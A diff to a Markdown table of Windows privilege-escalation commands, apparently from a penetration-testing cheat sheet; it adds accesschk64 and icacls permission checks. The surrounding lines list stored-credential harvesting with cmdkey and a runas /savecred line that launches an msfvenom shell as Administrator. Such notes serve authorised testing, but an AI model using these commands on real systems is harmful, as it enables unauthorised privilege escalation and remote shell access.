@@ -8,6 +8,8 @@
 | ```more < name_of_alternate_data_stream.txt``` | Returns the contents of the alternate data stream | 
 | ```cmdkey /list``` | We may get lucky and find stored credentials |
 | ```runas /savecred /user:DOM.LOCAL\Administrator "C:\Users\<user>\Documents\shell.exe"``` | If the user is storing creds, launch an msfvenom shell | 
+| ```accesschk64.exe -wvu <file.exe>``` | This will check the files access writes |
+| ```icacls.exe <filename.txt>``` | Does the same thing as accesschk64.exe but is native to OS |
 
 | Check | Description |
 | ---------------------------- | ---------------------------- |
